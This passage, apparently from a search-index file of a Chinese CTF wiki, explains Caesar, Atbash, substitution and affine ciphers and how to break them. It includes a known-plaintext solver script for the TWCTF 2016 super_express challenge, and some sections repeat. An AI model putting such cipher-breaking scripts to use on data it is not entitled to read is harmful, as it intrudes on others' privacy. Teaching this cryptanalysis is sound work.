\u65f6\uff0c\u4eff\u5c04\u52a0\u5bc6\u662f\u51ef\u6492\u52a0\u5bc6\u3002\u800c\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u5229\u7528\u4eff\u5c04\u5bc6\u7801\u65f6\uff0c\u5176\u5b57\u7b26\u96c6\u90fd\u7528\u7684\u662f\u5b57\u6bcd\u8868\uff0c\u4e00\u822c\u53ea\u670926\u4e2a\u5b57\u6bcd\uff0c\u800c\u4e0d\u5927\u4e8e26\u7684\u4e0e26\u4e92\u7d20\u7684\u4e2a\u6570\u4e00\u5171\u6709 \\phi(26)=\\phi(2) \\times \\phi(13) = 12 \\phi(26)=\\phi(2) \\times \\phi(13) = 12 \u7b97\u4e0ab\u7684\u504f\u79fb\u53ef\u80fd\uff0c\u4e00\u5171\u6709\u53ef\u80fd\u7684\u5bc6\u94a5\u7a7a\u95f4\u5927\u5c0f\u4e5f\u5c31\u662f 12 \\times 26 = 312 12 \\times 26 = 312 \u4e00\u822c\u6765\u8bf4\uff0c\u5bf9\u4e8e\u8be5\u79cd\u5bc6\u7801\uff0c\u6211\u4eec\u81f3\u5c11\u5f97\u662f\u5728\u5df2\u77e5\u90e8\u5206\u660e\u6587\u7684\u60c5\u51b5\u4e0b\u624d\u53ef\u4ee5\u653b\u51fb\u3002\u4e0b\u9762\u8fdb\u884c\u7b80\u5355\u7684\u5206\u6790\u3002 \u8fd9\u79cd\u5bc6\u7801\u7531\u4e24\u79cd\u53c2\u6570\u6765\u63a7\u5236\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u5176\u4e2d\u4efb\u610f\u4e00\u4e2a\u53c2\u6570\uff0c\u90a3\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u5feb\u901f\u679a\u4e3e\u53e6\u5916\u4e00\u4e2a\u53c2\u6570\u5f97\u5230\u7b54\u6848\u3002 \u4f46\u662f\uff0c\u5047\u8bbe\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u91c7\u7528\u7684\u5b57\u6bcd\u96c6\uff0c\u8fd9\u91cc\u5047\u8bbe\u4e3a26\u4e2a\u5b57\u6bcd\uff0c\u6211\u4eec\u8fd8\u6709\u53e6\u5916\u4e00\u79cd\u89e3\u5bc6\u65b9\u5f0f\uff0c\u6211\u4eec\u53ea\u9700\u8981\u77e5\u9053\u4e24\u4e2a\u52a0\u5bc6\u540e\u7684\u5b57\u6bcd y_1,y_2 y_1,y_2 \u5373\u53ef\u8fdb\u884c\u89e3\u5bc6\u3002\u90a3\u4e48\u6211\u4eec\u8fd8\u53ef\u4ee5\u77e5\u9053 y_1=(ax_1+b)\\pmod{26} \\\\ y_2=(ax_2+b)\\pmod{26} y_1=(ax_1+b)\\pmod{26} \\\\ y_2=(ax_2+b)\\pmod{26} \u4e24\u5f0f\u76f8\u51cf\uff0c\u53ef\u5f97 y_1-y_2=a(x_1-x_2)\\pmod{26} y_1-y_2=a(x_1-x_2)\\pmod{26} \u8fd9\u91cc y_1,y_2 y_1,y_2 \u5df2\u77e5\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u5bc6\u6587\u5bf9\u5e94\u7684\u4e24\u4e2a\u4e0d\u4e00\u6837\u7684\u5b57\u7b26 x_1 x_1 \u4e0e x_2 x_2 \uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5f88\u5bb9\u6613\u5f97\u5230 a a \uff0c\u8fdb\u800c\u5c31\u53ef\u4ee5\u5f97\u5230 b b \u4e86\u3002 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5TWCTF 2016 \u7684 super_express\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u7b80\u5355\u770b\u4e00\u4e0b\u7ed9\u7684\u6e90\u7801 import sys key = '****CENSORED***************' flag = 'TWCTF{*******CENSORED********}' if len ( key ) % 2 == 1 : print ( \"Key Length Error\" ) sys . exit ( 1 ) n = len ( key ) / 2 encrypted = '' for c in flag : c = ord ( c ) for a , b in zip ( key [ 0 : n ], key [ n : 2 * n ]): c = ( ord ( a ) * c + ord ( b )) % 251 encrypted += ' %02x ' % c print encrypted \u53ef\u4ee5\u53d1\u73b0\uff0c\u867d\u7136\u5bf9\u4e8e flag \u4e2d\u7684\u6bcf\u4e2a\u5b57\u6bcd\u90fd\u52a0\u5bc6\u4e86 n \u6b21\uff0c\u5982\u679c\u6211\u4eec\u4ed4\u7ec6\u5206\u6790\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0 \\begin{align*} c_1&=a_1c+b_1 \\\\ c_2&=a_2c_1+b_2 \\\\ &=a_1a_2c+a_2b_1+b_2 \\\\ &=kc+d \\end{align*} \\begin{align*} c_1&=a_1c+b_1 \\\\ c_2&=a_2c_1+b_2 \\\\ &=a_1a_2c+a_2b_1+b_2 \\\\ &=kc+d \\end{align*} \u6839\u636e\u7b2c\u4e8c\u884c\u7684\u63a8\u5bfc\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5176\u5b9e c_n c_n \u4e5f\u662f\u8fd9\u6837\u7684\u5f62\u5f0f\uff0c\u53ef\u4ee5\u770b\u6210 c_n=xc+y c_n=xc+y \uff0c\u5e76\u4e14\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u7684\u662f\uff0ckey \u662f\u59cb\u7ec8\u4e0d\u53d8\u5316\u7684\uff0c\u6240\u4ee5\u8bf4\uff0c\u5176\u5b9e\u8fd9\u4e2a\u5c31\u662f\u4eff\u5c04\u5bc6\u7801\u3002 \u6b64\u5916\uff0c\u9898\u76ee\u4e2d\u8fd8\u7ed9\u51fa\u4e86\u5bc6\u6587\u4ee5\u53ca\u90e8\u5206\u90e8\u5206\u5bc6\u6587\u5bf9\u5e94\u7684\u660e\u6587\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5f88\u5bb9\u6613\u5229\u7528\u5df2\u77e5\u660e\u6587\u653b\u51fb\u7684\u65b9\u6cd5\u6765\u653b\u51fb\u4e86\uff0c\u5229\u7528\u4ee3\u7801\u5982\u4e0b import gmpy key = '****CENSORED****************' flag = 'TWCTF{*******CENSORED********}' f = open ( 'encrypted' , 'r' ) data = f . read () . strip ( ' \\n ' ) encrypted = [ int ( data [ i : i + 2 ], 16 ) for i in range ( 0 , len ( data ), 2 )] plaindelta = ord ( flag [ 1 ]) - ord ( flag [ 0 ]) cipherdalte = encrypted [ 1 ] - encrypted [ 0 ] a = gmpy . invert ( plaindelta , 251 ) * cipherdalte % 251 b = ( encrypted [ 0 ] - a * ord ( flag [ 0 ])) % 251 a_inv = gmpy . invert ( a , 251 ) result = \"\" for c in encrypted : result += chr (( c - b ) * a_inv % 251 ) print result \u7ed3\u679c\u5982\u4e0b \u279c TWCTF2016-super_express git: ( master ) \u2717 python exploit.py TWCTF { Faster_Than_Shinkansen! }","title":"\u5355\u8868\u4ee3\u6362\u52a0\u5bc6"},{"location":"crypto/classical/monoalphabetic/#_1","text":"","title":"\u5355\u8868\u4ee3\u6362\u52a0\u5bc6"},{"location":"crypto/classical/monoalphabetic/#_2","text":"\u5728\u5355\u8868\u66ff\u6362\u52a0\u5bc6\u4e2d\uff0c\u6240\u6709\u7684\u52a0\u5bc6\u65b9\u5f0f\u51e0\u4e4e\u90fd\u6709\u4e00\u4e2a\u5171\u6027\uff0c\u90a3\u5c31\u662f\u660e\u5bc6\u6587\u4e00\u4e00\u5bf9\u5e94\u3002\u6240\u4ee5\u8bf4\uff0c\u4e00\u822c\u6709\u4ee5\u4e0b\u4e24\u79cd\u65b9\u5f0f\u6765\u8fdb\u884c\u7834\u89e3 \u5728\u5bc6\u94a5\u7a7a\u95f4\u8f83\u5c0f\u7684\u60c5\u51b5\u4e0b\uff0c\u91c7\u7528\u66b4\u529b\u7834\u89e3\u65b9\u5f0f \u5728\u5bc6\u6587\u957f\u5ea6\u8db3\u591f\u957f\u7684\u65f6\u5019\uff0c\u4f7f\u7528\u8bcd\u9891\u5206\u6790\uff0c http://quipqiup.com/ \u5f53\u5bc6\u94a5\u7a7a\u95f4\u8db3\u591f\u5927\uff0c\u800c\u5bc6\u6587\u957f\u5ea6\u8db3\u591f\u77ed\u7684\u60c5\u51b5\u4e0b\uff0c\u7834\u89e3\u8f83\u4e3a\u56f0\u96be\u3002","title":"\u901a\u7528\u7279\u70b9"},{"location":"crypto/classical/monoalphabetic/#_3","text":"","title":"\u51ef\u6492\u5bc6\u7801"},{"location":"crypto/classical/monoalphabetic/#_4","text":"\u51ef\u6492\u5bc6\u7801\uff08Caesar\uff09\u52a0\u5bc6\u65f6\u4f1a\u5c06\u660e\u6587\u4e2d\u7684 \u6bcf\u4e2a\u5b57\u6bcd \u90fd\u6309\u7167\u5176\u5728\u5b57\u6bcd\u8868\u4e2d\u7684\u987a\u5e8f\u5411\u540e\uff08\u6216\u5411\u524d\uff09\u79fb\u52a8\u56fa\u5b9a\u6570\u76ee\uff08 \u5faa\u73af\u79fb\u52a8 \uff09\u4f5c\u4e3a\u5bc6\u6587\u3002\u4f8b\u5982\uff0c\u5f53\u504f\u79fb\u91cf\u662f\u5de6\u79fb 3 \u7684\u65f6\u5019\uff08\u89e3\u5bc6\u65f6\u7684\u5bc6\u94a5\u5c31\u662f 3\uff09\uff1a \u660e\u6587\u5b57\u6bcd\u8868\uff1aABCDEFGHIJKLMNOPQRSTUVWXYZ \u5bc6\u6587\u5b57\u6bcd\u8868\uff1aDEFGHIJKLMNOPQRSTUVWXYZABC \u4f7f\u7528\u65f6\uff0c\u52a0\u5bc6\u8005\u67e5\u627e\u660e\u6587\u5b57\u6bcd\u8868\u4e2d\u9700\u8981\u52a0\u5bc6\u7684\u6d88\u606f\u4e2d\u7684\u6bcf\u4e00\u4e2a\u5b57\u6bcd\u6240\u5728\u4f4d\u7f6e\uff0c\u5e76\u4e14\u5199\u4e0b\u5bc6\u6587\u5b57\u6bcd\u8868\u4e2d\u5bf9\u5e94\u7684\u5b57\u6bcd\u3002\u9700\u8981\u89e3\u5bc6\u7684\u4eba\u5219\u6839\u636e\u4e8b\u5148\u5df2\u77e5\u7684\u5bc6\u94a5\u53cd\u8fc7\u6765\u64cd\u4f5c\uff0c\u5f97\u5230\u539f\u6765\u7684\u660e\u6587\u3002\u4f8b\u5982\uff1a \u660e\u6587\uff1aTHE QUICK BROWN FOX JUMPS OVER THE LAZY DOG \u5bc6\u6587\uff1aWKH TXLFN EURZQ IRA MXPSV RYHU WKH ODCB GRJ \u6839\u636e\u504f\u79fb\u91cf\u7684\u4e0d\u540c\uff0c\u8fd8\u5b58\u5728 \u82e5\u5e72\u7279\u5b9a\u7684\u607a\u6492\u5bc6\u7801\u540d\u79f0 \uff1a \u504f\u79fb\u91cf\u4e3a 10\uff1aAvocat \uff08A\u2192K\uff09 \u504f\u79fb\u91cf\u4e3a 13\uff1a ROT13 \u504f\u79fb\u91cf\u4e3a -5\uff1aCassis \uff08K 6\uff09 \u504f\u79fb\u91cf\u4e3a -6\uff1aCassette \uff08K 7\uff09 \u6b64\u5916\uff0c\u8fd8\u6709\u8fd8\u6709\u4e00\u79cd\u57fa\u4e8e\u5bc6\u94a5\u7684\u51ef\u6492\u5bc6\u7801 Keyed Caesar\u3002\u5176\u57fa\u672c\u539f\u7406\u662f \u5229\u7528\u4e00\u4e2a\u5bc6\u94a5\uff0c\u5c06\u5bc6\u94a5\u7684\u6bcf\u4e00\u4f4d\u8f6c\u6362\u4e3a\u6570\u5b57\uff08\u4e00\u822c\u8f6c\u5316\u4e3a\u5b57\u6bcd\u8868\u5bf9\u5e94\u987a\u5e8f\u7684\u6570\u5b57\uff09\uff0c\u5206\u522b\u4ee5\u8fd9\u4e00\u6570\u5b57\u4e3a\u5bc6\u94a5\u52a0\u5bc6\u660e\u6587\u7684\u6bcf\u4e00\u4f4d\u5b57\u6bcd\u3002 \u8fd9\u91cc\u4ee5 XMan \u4e00\u671f\u590f\u4ee4\u8425\u5206\u4eab\u8d5b\u5bab\u4fdd\u9e21\u4e01\u961f Crypto 100 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u5bc6\u6587\uff1as0a6u3u1s0bv1a \u5bc6\u94a5\uff1aguangtou \u504f\u79fb\uff1a6,20,0,13,6,19,14,20 \u660e\u6587\uff1ay0u6u3h1y0uj1u","title":"\u539f\u7406"},{"location":"crypto/classical/monoalphabetic/#_5","text":"\u5bf9\u4e8e\u4e0d\u5e26\u5bc6\u94a5\u7684\u51ef\u6492\u5bc6\u7801\u6765\u8bf4\uff0c\u5176\u57fa\u672c\u7684\u7834\u89e3\u65b9\u6cd5\u6709\u4e24\u79cd\u65b9\u5f0f \u904d\u5386 26 \u4e2a\u504f\u79fb\u91cf\uff0c\u9002\u7528\u4e8e\u666e\u904d\u60c5\u51b5 \u5229\u7528\u8bcd\u9891\u5206\u6790\uff0c\u9002\u7528\u4e8e\u5bc6\u6587\u8f83\u957f\u7684\u60c5\u51b5\u3002 \u5176\u4e2d\uff0c\u7b2c\u4e00\u79cd\u65b9\u5f0f\u80af\u5b9a\u53ef\u4ee5\u5f97\u5230\u660e\u6587\uff0c\u800c\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u5219\u4e0d\u4e00\u5b9a\u53ef\u4ee5\u5f97\u5230\u6b63\u786e\u7684\u660e\u6587\u3002 \u800c\u5bf9\u4e8e\u57fa\u4e8e\u5bc6\u94a5\u7684\u51ef\u6492\u5bc6\u7801\u6765\u8bf4\uff0c\u4e00\u822c\u6765\u8bf4\u5fc5\u987b\u77e5\u9053\u5bf9\u5e94\u7684\u5bc6\u94a5\u3002","title":"\u7834\u89e3"},{"location":"crypto/classical/monoalphabetic/#_6","text":"\u4e00\u822c\u6211\u4eec\u6709\u5982\u4e0b\u7684\u5de5\u5177\uff0c\u5176\u4e2dJPK\u6bd4\u8f83\u901a\u7528\u3002 JPK\uff0c\u53ef\u89e3\u5e26\u5bc6\u94a5\u4e0e\u4e0d\u5e26\u5bc6\u94a5 http://planetcalc.com/1434/ http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php","title":"\u5de5\u5177"},{"location":"crypto/classical/monoalphabetic/#_7","text":"\u4e0e\u51ef\u6492\u5bc6\u7801\u7c7b\u4f3c\uff0c\u533a\u522b\u5728\u4e8e\u79fb\u4f4d\u5bc6\u7801\u4e0d\u4ec5\u4f1a\u5904\u7406\u5b57\u6bcd\uff0c\u8fd8\u4f1a\u5904\u7406\u6570\u5b57\u548c\u7279\u6b8a\u5b57\u7b26\uff0c\u5e38\u7528 ASCII \u7801\u8868\u8fdb\u884c\u79fb\u4f4d\u3002\u5176\u7834\u89e3\u65b9\u6cd5\u4e5f\u662f\u904d\u5386\u6240\u6709\u7684\u53ef\u80fd\u6027\u6765\u5f97\u5230\u53ef\u80fd\u7684\u7ed3\u679c\u3002","title":"\u79fb\u4f4d\u5bc6\u7801"},{"location":"crypto/classical/monoalphabetic/#atbash-cipher","text":"","title":"Atbash Cipher"},{"location":"crypto/classical/monoalphabetic/#_8","text":"\u57c3\u7279\u5df4\u4ec0\u7801\uff08Atbash Cipher\uff09\u5176\u5b9e\u53ef\u4ee5\u89c6\u4e3a\u4e0b\u9762\u8981\u4ecb\u7ecd\u7684\u7b80\u5355\u66ff\u6362\u5bc6\u7801\u7684\u7279\u4f8b\uff0c\u5b83\u4f7f\u7528\u5b57\u6bcd\u8868\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u6bcd\u4ee3\u8868\u7b2c\u4e00\u4e2a\u5b57\u6bcd\uff0c\u5012\u6570\u7b2c\u4e8c\u4e2a\u5b57\u6bcd\u4ee3\u8868\u7b2c\u4e8c\u4e2a\u5b57\u6bcd\u3002\u5728\u7f57\u9a6c\u5b57\u6bcd\u8868\u4e2d\uff0c\u5b83\u662f\u8fd9\u6837\u51fa\u73b0\u7684\uff1a \u660e\u6587\uff1aA B C D E F G H I J K L M N O P Q R S T U V W X Y Z \u5bc6\u6587\uff1aZ Y X W V U T S R Q P O N M L K J I H G F E D C B A \u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\uff1a \u660e\u6587\uff1athe quick brown fox jumps over the lazy dog \u5bc6\u6587\uff1agsv jfrxp yildm ulc qfnkh levi gsv ozab wlt","title":"\u539f\u7406"},{"location":"crypto/classical/monoalphabetic/#_9","text":"\u53ef\u4ee5\u770b\u51fa\u5176\u5bc6\u94a5\u7a7a\u95f4\u8db3\u591f\u77ed\uff0c\u540c\u65f6\u5f53\u5bc6\u6587\u8db3\u591f\u957f\u65f6\uff0c\u4ecd\u7136\u53ef\u4ee5\u91c7\u7528\u8bcd\u9891\u5206\u6790\u7684\u65b9\u6cd5\u89e3\u51b3\u3002","title":"\u7834\u89e3"},{"location":"crypto/classical/monoalphabetic/#_10","text":"http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/","title":"\u5de5\u5177"},{"location":"crypto/classical/monoalphabetic/#_11","text":"","title":"\u7b80\u5355\u66ff\u6362\u5bc6\u7801"},{"location":"crypto/classical/monoalphabetic/#_12","text":"\u7b80\u5355\u66ff\u6362\u5bc6\u7801\uff08Simple Substitution Cipher\uff09\u52a0\u5bc6\u65f6\uff0c\u5c06\u6bcf\u4e2a\u660e\u6587\u5b57\u6bcd\u66ff\u6362\u4e3a\u4e0e\u4e4b\u552f\u4e00\u5bf9\u5e94\u4e14\u4e0d\u540c\u7684\u5b57\u6bcd\u3002\u5b83\u4e0e\u607a\u6492\u5bc6\u7801\u4e4b\u95f4\u7684\u533a\u522b\u662f\u5176\u5bc6\u7801\u5b57\u6bcd\u8868\u7684\u5b57\u6bcd\u4e0d\u662f\u7b80\u5355\u7684\u79fb\u4f4d\uff0c\u800c\u662f\u5b8c\u5168\u662f\u6df7\u4e71\u7684\uff0c\u8fd9\u4e5f\u4f7f\u5f97\u5176\u7834\u89e3\u96be\u5ea6\u8981\u9ad8\u4e8e\u51ef\u6492\u5bc6\u7801\u3002 \u6bd4\u5982\uff1a \u660e\u6587\u5b57\u6bcd : abcdefghijklmnopqrstuvwxyz \u5bc6\u94a5\u5b57\u6bcd : phqgiumeaylnofdxjkrcvstzwb a \u5bf9\u5e94 p\uff0cd \u5bf9\u5e94 h\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002 \u660e\u6587\uff1athe quick brown fox jumps over the lazy dog \u5bc6\u6587\uff1acei jvaql hkdtf udz yvoxr dsik cei npbw gdm \u800c\u89e3\u5bc6\u65f6\uff0c\u6211\u4eec\u4e00\u822c\u662f\u77e5\u9053\u4e86\u6bcf\u4e00\u4e2a\u5b57\u6bcd\u7684\u5bf9\u5e94\u89c4\u5219\uff0c\u624d\u53ef\u4ee5\u6b63\u5e38\u89e3\u5bc6\u3002","title":"\u539f\u7406"},{"location":"crypto/classical/monoalphabetic/#_13","text":"\u7531\u4e8e\u8fd9\u79cd\u52a0\u5bc6\u65b9\u5f0f\u5bfc\u81f4\u5176\u6240\u6709\u7684\u5bc6\u94a5\u4e2a\u6570\u662f 26! 26! \uff0c\u6240\u4ee5\u51e0\u4e4e\u4e0a\u4e0d\u53ef\u80fd\u4f7f\u7528\u66b4\u529b\u7684\u89e3\u51b3\u65b9\u5f0f\u3002\u6240\u4ee5\u6211\u4eec \u4e00\u822c\u91c7\u7528\u8bcd\u9891\u5206\u6790\u3002","title":"\u7834\u89e3"},{"location":"crypto/classical/monoalphabetic/#_14","text":"http://quipqiup.com/","title":"\u5de5\u5177"},{"location":"crypto/classical/monoalphabetic/#_15","text":"","title":"\u4eff\u5c04\u5bc6\u7801"},{"location":"crypto/classical/monoalphabetic/#_16","text":"\u4eff\u5c04\u5bc6\u7801\u7684\u52a0\u5bc6\u51fd\u6570\u662f E(x)=(ax+b)\\pmod m E(x)=(ax+b)\\pmod m \uff0c\u5176\u4e2d x x \u8868\u793a\u660e\u6587\u6309\u7167\u67d0\u79cd\u7f16\u7801\u5f97\u5230\u7684\u6570\u5b57 a a \u548c m m \u4e92\u8d28 m m \u662f\u7f16\u7801\u7cfb\u7edf\u4e2d\u5b57\u6bcd\u7684\u6570\u76ee\u3002 \u89e3\u5bc6\u51fd\u6570\u662f D(x)=a^{-1}(x-b)\\pmod m D(x)=a^{-1}(x-b)\\pmod m \uff0c\u5176\u4e2d a^{-1} a^{-1} \u662f a a \u5728 \\mathbb{Z}_{m} \\mathbb{Z}_{m} \u7fa4\u7684\u4e58\u6cd5\u9006\u5143\u3002 \u4e0b\u9762\u6211\u4eec\u4ee5 E(x) = (5x + 8) \\bmod 26 E(x) = (5x + 8) \\bmod 26 \u51fd\u6570\u4e3a\u4f8b\u5b50\u8fdb\u884c\u4ecb\u7ecd\uff0c\u52a0\u5bc6\u5b57\u7b26\u4e32\u4e3a AFFINE CIPHER \uff0c\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u91c7\u7528\u5b57\u6bcd\u886826\u4e2a\u5b57\u6bcd\u4f5c\u4e3a\u7f16\u7801\u7cfb\u7edf \u660e\u6587 A F F I N E C I P H E R x 0 5 5 8 13 4 2 8 15 7 4 17 y=5x+8 y=5x+8 8 33 33 48 73 28 18 48 83 43 28 93 y\\mod26 y\\mod26 8 7 7 22 21 2 18 22 5 17 2 15 \u5bc6\u6587 I H H W V C S W F R C P \u5176\u5bf9\u5e94\u7684\u52a0\u5bc6\u7ed3\u679c\u662f IHHWVCSWFRCP \u3002 \u5bf9\u4e8e\u89e3\u5bc6\u8fc7\u7a0b\uff0c\u6b63\u5e38\u89e3\u5bc6\u8005\u5177\u6709a\u4e0eb\uff0c\u53ef\u4ee5\u8ba1\u7b97\u5f97\u5230 a^{-1} a^{-1} \u4e3a 21\uff0c\u6240\u4ee5\u5176\u89e3\u5bc6\u51fd\u6570\u662f D(x)=21(x-8)\\pmod {26} D(x)=21(x-8)\\pmod {26} \uff0c\u89e3\u5bc6\u5982\u4e0b \u5bc6\u6587 I H H W V C S W F R C P y y 8 7 7 22 21 2 18 22 5 17 2 15 x=21(y-8) x=21(y-8) 0 -21 -21 294 273 -126 210 294 -63 189 -126 147 x\\mod26 x\\mod26 0 5 5 8 13 4 2 8 15 7 4 17 \u660e\u6587 A F F I N E C I P H E R \u53ef\u4ee5\u770b\u51fa\u5176\u7279\u70b9\u5728\u4e8e\u53ea\u6709 26 \u4e2a\u82f1\u6587\u5b57\u6bcd\u3002","title":"\u539f\u7406"},{"location":"crypto/classical/monoalphabetic/#_17","text":"\u9996\u5148\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7684\u662f\uff0c\u4eff\u5c04\u5bc6\u7801\u5bf9\u4e8e\u4efb\u610f\u4e24\u4e2a\u4e0d\u540c\u7684\u5b57\u6bcd\uff0c\u5176\u6700\u540e\u5f97\u5230\u7684\u5bc6\u6587\u5fc5\u7136\u4e0d\u4e00\u6837\uff0c\u6240\u4ee5\u5176\u4e5f\u5177\u6709\u6700\u901a\u7528\u7684\u7279\u70b9\u3002\u5f53\u5bc6\u6587\u957f\u5ea6\u8db3\u591f\u957f\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u9891\u7387\u5206\u6790\u7684\u65b9\u6cd5\u6765\u89e3\u51b3\u3002 \u5176\u6b21\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u5982\u4f55\u653b\u51fb\u8be5\u5bc6\u7801\u3002\u53ef\u4ee5\u770b\u51fa\u5f53 a=1 a=1 \u65f6\uff0c\u4eff\u5c04\u52a0\u5bc6\u662f\u51ef\u6492\u52a0\u5bc6\u3002\u800c\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u5229\u7528\u4eff\u5c04\u5bc6\u7801\u65f6\uff0c\u5176\u5b57\u7b26\u96c6\u90fd\u7528\u7684\u662f\u5b57\u6bcd\u8868\uff0c\u4e00\u822c\u53ea\u670926\u4e2a\u5b57\u6bcd\uff0c\u800c\u4e0d\u5927\u4e8e26\u7684\u4e0e26\u4e92\u7d20\u7684\u4e2a\u6570\u4e00\u5171\u6709 \\phi(26)=\\phi(2) \\times \\phi(13) = 12 \\phi(26)=\\phi(2) \\times \\phi(13) = 12 \u7b97\u4e0ab\u7684\u504f\u79fb\u53ef\u80fd\uff0c\u4e00\u5171\u6709\u53ef\u80fd\u7684\u5bc6\u94a5\u7a7a\u95f4\u5927\u5c0f\u4e5f\u5c31\u662f 12 \\times 26 = 312 12 \\times 26 = 312 \u4e00\u822c\u6765\u8bf4\uff0c\u5bf9\u4e8e\u8be5\u79cd\u5bc6\u7801\uff0c\u6211\u4eec\u81f3\u5c11\u5f97\u662f\u5728\u5df2\u77e5\u90e8\u5206\u660e\u6587\u7684\u60c5\u51b5\u4e0b\u624d\u53ef\u4ee5\u653b\u51fb\u3002\u4e0b\u9762\u8fdb\u884c\u7b80\u5355\u7684\u5206\u6790\u3002 \u8fd9\u79cd\u5bc6\u7801\u7531\u4e24\u79cd\u53c2\u6570\u6765\u63a7\u5236\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u5176\u4e2d\u4efb\u610f\u4e00\u4e2a\u53c2\u6570\uff0c\u90a3\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u5feb\u901f\u679a\u4e3e\u53e6\u5916\u4e00\u4e2a\u53c2\u6570\u5f97\u5230\u7b54\u6848\u3002 \u4f46\u662f\uff0c\u5047\u8bbe\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u91c7\u7528\u7684\u5b57\u6bcd\u96c6\uff0c\u8fd9\u91cc\u5047\u8bbe\u4e3a26\u4e2a\u5b57\u6bcd\uff0c\u6211\u4eec\u8fd8\u6709\u53e6\u5916\u4e00\u79cd\u89e3\u5bc6\u65b9\u5f0f\uff0c\u6211\u4eec\u53ea\u9700\u8981\u77e5\u9053\u4e24\u4e2a\u52a0\u5bc6\u540e\u7684\u5b57\u6bcd y_1,y_2 y_1,y_2 \u5373\u53ef\u8fdb\u884c\u89e3\u5bc6\u3002\u90a3\u4e48\u6211\u4eec\u8fd8\u53ef\u4ee5\u77e5\u9053 y_1=(ax_1+b)\\pmod{26} \\\\ y_2=(ax_2+b)\\pmod{26} y_1=(ax_1+b)\\pmod{26} \\\\ y_2=(ax_2+b)\\pmod{26} \u4e24\u5f0f\u76f8\u51cf\uff0c\u53ef\u5f97 y_1-y_2=a(x_1-x_2)\\pmod{26} y_1-y_2=a(x_1-x_2)\\pmod{26} \u8fd9\u91cc y_1,y_2 y_1,y_2 \u5df2\u77e5\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u5bc6\u6587\u5bf9\u5e94\u7684\u4e24\u4e2a\u4e0d\u4e00\u6837\u7684\u5b57\u7b26 x_1 x_1 \u4e0e x_2 x_2 \uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5f88\u5bb9\u6613\u5f97\u5230 a a \uff0c\u8fdb\u800c\u5c31\u53ef\u4ee5\u5f97\u5230 b b \u4e86\u3002","title":"\u7834\u89e3"},{"location":"crypto/classical/monoalphabetic/#_18","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5TWCTF 2016 \u7684 super_express\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u7b80\u5355\u770b\u4e00\u4e0b\u7ed9\u7684\u6e90\u7801 import sys key = '****CENSORED***************' flag = 'TWCTF{*******CENSORED********}' if len ( key ) % 2 == 1 : print ( \"Key Length Error\" ) sys . exit ( 1 ) n = len ( key ) / 2 encrypted = '' for c in flag : c = ord ( c ) for a , b in zip ( key [ 0 : n ], key [ n : 2 * n ]): c = ( ord ( a ) * c + ord ( b )) % 251 encrypted += ' %02x ' % c print encrypted \u53ef\u4ee5\u53d1\u73b0\uff0c\u867d\u7136\u5bf9\u4e8e flag \u4e2d\u7684\u6bcf\u4e2a\u5b57\u6bcd\u90fd\u52a0\u5bc6\u4e86 n \u6b21\uff0c\u5982\u679c\u6211\u4eec\u4ed4\u7ec6\u5206\u6790\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0 \\begin{align*} c_1&=a_1c+b_1 \\\\ c_2&=a_2c_1+b_2 \\\\ &=a_1a_2c+a_2b_1+b_2 \\\\ &=kc+d \\end{align*} \\begin{align*} c_1&=a_1c+b_1 \\\\ c_2&=a_2c_1+b_2 \\\\ &=a_1a_2c+a_2b_1+b_2 \\\\ &=kc+d \\end{align*} \u6839\u636e\u7b2c\u4e8c\u884c\u7684\u63a8\u5bfc\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5176\u5b9e c_n c_n \u4e5f\u662f\u8fd9\u6837\u7684\u5f62\u5f0f\uff0c\u53ef\u4ee5\u770b\u6210 c_n=xc+y c_n=xc+y \uff0c\u5e76\u4e14\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u7684\u662f\uff0ckey \u662f\u59cb\u7ec8\u4e0d\u53d8\u5316\u7684\uff0c\u6240\u4ee5\u8bf4\uff0c\u5176\u5b9e\u8fd9\u4e2a\u5c31\u662f\u4eff\u5c04\u5bc6\u7801\u3002 \u6b64\u5916\uff0c\u9898\u76ee\u4e2d\u8fd8\u7ed9\u51fa\u4e86\u5bc6\u6587\u4ee5\u53ca\u90e8\u5206\u90e8\u5206\u5bc6\u6587\u5bf9\u5e94\u7684\u660e\u6587\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5f88\u5bb9\u6613\u5229\u7528\u5df2\u77e5\u660e\u6587\u653b\u51fb\u7684\u65b9\u6cd5\u6765\u653b\u51fb\u4e86\uff0c\u5229\u7528\u4ee3\u7801\u5982\u4e0b import gmpy key = 